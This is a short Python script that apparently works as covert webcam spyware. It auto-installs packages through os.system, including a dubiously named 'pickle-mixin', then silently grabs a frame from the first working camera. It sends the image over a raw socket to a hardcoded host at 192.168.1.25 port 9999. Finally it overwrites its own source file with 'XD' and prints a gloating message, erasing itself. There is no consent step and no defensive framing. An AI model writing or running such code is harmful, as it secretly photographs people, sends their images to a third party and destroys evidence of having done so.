import os
import sys
import time
import socket
def smart_import(module, pip_name=None):
    try:
        return __import__(module)
    except:
        os.system(f"pip install {pip_name or module}")
        time.sleep(1)
        return __import__(module)

cv2 = smart_import("cv2", "opencv-python")
pickle = smart_import("pickle", "pickle-mixin")
def find_cam():
    for i in range(5):
        cap = cv2.VideoCapture(i)
        if cap.isOpened():
            cap.release()
            return i
    return -1

cam_index = find_cam()
if cam_index == -1:
    sys.exit("❌ No webcam available")
cap = cv2.VideoCapture(cam_index)
ret, frame = cap.read()
cap.release()
if not ret:
    sys.exit("❌ Webcam capture failed")
_, buffer = cv2.imencode(".jpg", frame)
img_data = buffer.tobytes()
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.25", 9999))
    s.sendall(pickle.dumps(img_data))
    s.shutdown(socket.SHUT_RDWR)
    s.close()
except Exception as e:
    print("❌ Sending failed:", e)
time.sleep(1.5)
try:
    with open(sys.argv[0], "w", encoding="utf-8") as f:
        f.write("XD")
    print("You know what? 😈😈😈,this file is now XD")
except Exception as e:
    print("❌ Couldn't overwrite file:", e)
